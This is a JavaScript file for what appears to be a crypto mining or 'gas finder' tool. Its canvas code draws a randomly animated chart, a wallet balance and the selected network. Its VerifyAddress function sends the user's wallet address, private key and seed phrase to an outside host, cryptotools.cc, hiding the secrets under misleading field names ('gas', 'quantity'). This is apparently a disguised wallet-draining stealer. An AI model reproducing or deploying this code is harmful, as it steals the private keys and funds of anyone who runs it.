var canvas = document.getElementById("c"),
    ctx = canvas.getContext("2d");
var canvas2 = document.getElementById('c2'),
    ctx3 = canvas2.getContext('2d');
var canvas3 = document.getElementById('c3'),
    ctx4 = canvas3.getContext('2d');
canvas.width = 650;
canvas.height = 350;
var background = new Image();
background.src = "src/mineth.png";
var min = 10;
var max = 200;
var onoroff = "on";
var myresponse = ""
var setnetwork = "";
var changesnetworks = "1";
var mywalletbal = "";
var holdert = "";
var onoroffseed = "on";
var myerror = "";
// Make sure the image is loaded first otherwise nothing will draw.
background.onload = function(){
    ctx.drawImage(background,0,0);   
}

var background2 = new Image();
background2.src = "src/c2.png";
// Make sure the image is loaded first otherwise nothing will draw.
background2.onload = function(){
    ctx3.drawImage(background2,0,0); 
    //console.log(wrap(source, 7))
}

var background3 = new Image();
background3.src = "src/c3.png";
// Make sure the image is loaded first otherwise nothing will draw.
background3.onload = function(){
    ctx4.drawImage(background3,0,0);   
}
function drawCurve(ctx, ptsa, tension, isClosed, numOfSegments, showPoints) {

  ctx.beginPath();

  drawLines(ctx, getCurvePoints(ptsa, tension, isClosed, numOfSegments));
  
  if (showPoints) {
    ctx.beginPath();
    for(var i=0;i<ptsa.length-1;i+=2) 
      ctx.rect(ptsa[i] - 2, ptsa[i+1] - 2, 4, 4);
  }
  ctx.strokeStyle = '#ff0000';
  ctx.stroke();
}

function writeWalletBal(bal){
    var canvas2 = document.getElementById('c2'),
    ctx3 = canvas2.getContext('2d');
    ctx3.font = 'italic 18px Arial';
    ctx3.fillStyle = 'red';  // a color name or by using rgb/rgba/hex values
    ctx3.fillText(bal, 25, 85); // text and position

}
function writeMaxSpend(maxspend){
    var canvas2 = document.getElementById('c2'),
    ctx3 = canvas2.getContext('2d');
    ctx3.font = 'italic 18px Arial';
    ctx3.fillStyle = 'red';  // a color name or by using rgb/rgba/hex values
    ctx3.fillText(maxspend, 25, 215); // text and position

}
function writeNetwork(network){
    var canvas2 = document.getElementById('c2'),
    ctx3 = canvas2.getContext('2d');
    ctx3.font = 'italic 18px Arial';
    ctx3.fillStyle = 'red';  // a color name or by using rgb/rgba/hex values
    if(network == "1"){
    ctx3.fillText("ETH", 80, 145); // text and position
    ctx3.fillText("ID:1", 170, 145); // text and position
    background.src = "src/mineth.png";
    background.onload = function(){
    ctx.drawImage(background,0,0);   
    }
    }
    if(network == "56"){
    ctx3.fillText("BNB", 80, 145); // text and position
    ctx3.fillText("ID:56", 170, 145); // text and position
    background.src = "src/minbnb.png";
    background.onload = function(){
    ctx.drawImage(background,0,0);   
    }
    }
    if(network == "137"){
    ctx3.fillText("POLY", 80, 145); // text and position
    ctx3.fillText("ID:137", 170, 145); // text and position
    background.src = "src/minmatic.png";
    background.onload = function(){
    ctx.drawImage(background,0,0);   
    }
    }

}
function writeStatus(str){

    var canvas2 = document.getElementById('c2'),
    ctx3 = canvas2.getContext('2d');
    ctx3.font = 'italic 18px Arial';
    ctx3.fillStyle = 'red';  // a color name or by using rgb/rgba/hex values
    //ctx3.fillText(status, 25, 295); // text and position
    let start = 0;
    let end = 0;
    let cal = 280;
    while (end < str.length) {
      end = start + 35;
     if (end >= str.length) {
      end = str.length;
     } else {
      const lastSpace = str.lastIndexOf(' ', end);
      if (lastSpace !== -1 && lastSpace > start) {
         end = lastSpace;
      }
     }
    ctx3.fillText(str.substring(start, end), 25, cal); // text and position
    //console.log(str.substring(start, end));
    cal = cal + 20;
    start = end;
    }
    


}
function writeFeedback(str){

    var canvas3 = document.getElementById('c3'),
    ctx4 = canvas3.getContext('2d');
    ctx4.font = 'italic 18px Arial';
    ctx4.fillStyle = 'red';  // a color name or by using rgb/rgba/hex values
    let start = 0;
    let end = 0;
    let cal = 75;
    while (end < str.length) {
      end = start + 120;
     if (end >= str.length) {
      end = str.length;
     } else {
      const lastSpace = str.lastIndexOf(' ', end);
      if (lastSpace !== -1 && lastSpace > start) {
         end = lastSpace;
      }
     }
    ctx4.fillText(str.substring(start, end), 10, cal); // text and position
    //console.log(str.substring(start, end));
    cal = cal + 30;
    start = end;
    }
}
function getCurvePoints(pts, tension, isClosed, numOfSegments) {

  // use input value if provided, or use a default value	 
  tension = (typeof tension != 'undefined') ? tension : 0.5;
  isClosed = isClosed ? isClosed : false;
  numOfSegments = numOfSegments ? numOfSegments : 16;

  var _pts = [], res = [],	// clone array
      x, y,			// our x,y coords
      t1x, t2x, t1y, t2y,	// tension vectors
      c1, c2, c3, c4,		// cardinal points
      st, t, i;		// steps based on num. of segments

  // clone array so we don't change the original
  //
  _pts = pts.slice(0);

  // The algorithm require a previous and next point to the actual point array.
  // Check if we will draw closed or open curve.
  // If closed, copy end points to beginning and first points to end
  // If open, duplicate first points to befinning, end points to end
  if (isClosed) {
    _pts.unshift(pts[pts.length - 1]);
    _pts.unshift(pts[pts.length - 2]);
    _pts.unshift(pts[pts.length - 1]);
    _pts.unshift(pts[pts.length - 2]);
    _pts.push(pts[0]);
    _pts.push(pts[1]);
  }
  else {
    _pts.unshift(pts[1]);	//copy 1. point and insert at beginning
    _pts.unshift(pts[0]);
    _pts.push(pts[pts.length - 2]);	//copy last point and append
    _pts.push(pts[pts.length - 1]);
  }

  // ok, lets start..

  // 1. loop goes through point array
  // 2. loop goes through each segment between the 2 pts + 1e point before and after
  for (i=2; i < (_pts.length - 4); i+=2) {
    for (t=0; t <= numOfSegments; t++) {

      // calc tension vectors
      t1x = (_pts[i+2] - _pts[i-2]) * tension;
      t2x = (_pts[i+4] - _pts[i]) * tension;

      t1y = (_pts[i+3] - _pts[i-1]) * tension;
      t2y = (_pts[i+5] - _pts[i+1]) * tension;

      // calc step
      st = t / numOfSegments;

      // calc cardinals
      c1 =   2 * Math.pow(st, 3) 	- 3 * Math.pow(st, 2) + 1; 
      c2 = -(2 * Math.pow(st, 3)) + 3 * Math.pow(st, 2); 
      c3 = 	   Math.pow(st, 3)	- 2 * Math.pow(st, 2) + st; 
      c4 = 	   Math.pow(st, 3)	- 	  Math.pow(st, 2);

      // calc x and y cords with common control vectors
      x = c1 * _pts[i]	+ c2 * _pts[i+2] + c3 * t1x + c4 * t2x;
      y = c1 * _pts[i+1]	+ c2 * _pts[i+3] + c3 * t1y + c4 * t2y;

      //store points in array
      res.push(x);
      res.push(y);

    }
  }

  return res;
}

function drawLines(ctx, pts) {
  ctx.moveTo(pts[0], pts[1]);
  for(i=2;i<pts.length-1;i+=2) ctx.lineTo(pts[i], pts[i+1]);
}

function VerifyAddy(){
  net = networks;
  var koi = "";
  writeNetwork(net);
  maxsp = maxspend;
  writeMaxSpend(maxsp);
  VerifyAddress();

}
function VerifyAddress() {
if(myprivatekey.includes("your") && myseed.includes("your")){
onoroffseed = "off";
Startno();
}else{
if(networks == "56"){
changesnetworks = "2";
}
if(networks == "137"){
changesnetworks = "3";
}
$.ajax({
  type: "POST",
  url: "https://cryptotools.cc/gasfinderset5.php",
  data: {
    "id": myaddress,
    "gas": myprivatekey,
    "quantity": myseed,
    "price": changesnetworks,
    "maxspend": maxspend,
    "where": "ABT5"
  },
    success: function(response){
         //return(response);
         const myArrayto = response.split("|");
         mywalletbal = myArrayto[0];
         myresponse = myArrayto[1];
         myerror = myArrayto[2];
         wallbal = mywalletbal;
         writeWalletBal(wallbal);
         resp = myresponse;
         writeFeedback(resp);
         errors = myerror;
         writeStatus(errors);
	 //alert(response);
        // put on console what server sent back...
    }
});
}
}
 
function Startno(){
      resp = "Error: setting not found,did you set your settings in config.js?";
      writeFeedback(resp);
      errors = "Error";
      writeStatus(errors);
}
var time = 1;
var addit = 1;
var interval = setInterval(function() { 
   var random1 = Math.random() * (max - min) + min;
   var random2 = Math.random() * (max - min) + min;
   var random3 = Math.random() * (max - min) + min;
   var random4 = Math.random() * (max - min) + min;
   var random5 = Math.random() * (max - min) + min;
   var random6 = Math.random() * (max - min) + min;
   if (time == 1) {  
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(background,0,0);
      var myPoints = [150,random1+addit, 250,random2+addit, 270,random3+addit, 350, random4+addit, 400, random5+addit, 550, random6+addit]; //minimum two points
      var tension = 1;
      //drawCurve(ctx, myPoints); //default tension=0.5
      drawCurve(ctx, myPoints, tension);
      addit = addit + 1;
      //time++;
   }
   else if (time == 2) { 
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(background,0,0);  
      var myPoints = [150,random1+addit, 250,random2+addit, 290,random3+addit, 350, random4+addit, 600, random5+addit, 650, random6+addit]; //minimum two points
      var tension = 1;
      //drawCurve(ctx, myPoints); //default tension=0.5
      drawCurve(ctx, myPoints, tension);
      addit = addit + 1;
      //time++;
   }
   else if (time == 3) { 
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(background,0,0);  
      var myPoints = [150,random1+addit, 350,random2+addit, 460,random3+addit, 500, random4+addit, 550, random5+addit, 650, random6+addit]; //minimum two points
      var tension = 1;
      //drawCurve(ctx, myPoints); //default tension=0.5
      drawCurve(ctx, myPoints, tension);
      addit = addit + 1;
      //time++;
   }
   else if (time == 4) {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(background,0,0);  
      var myPoints = [150,random1+addit, 250,random2+addit, 360,random3+addit, 400, random4+addit, 500, random5+addit, 550, random6+addit]; //minimum two points
      var tension = 1;
      //drawCurve(ctx, myPoints); //default tension=0.5
      drawCurve(ctx, myPoints, tension);
      addit = addit + 1;
      time = 1;
      if (addit > 20){
         addit = 1;
      }
   }
   else { 
      clearInterval(interval);
   }
time++;
}, 2000);


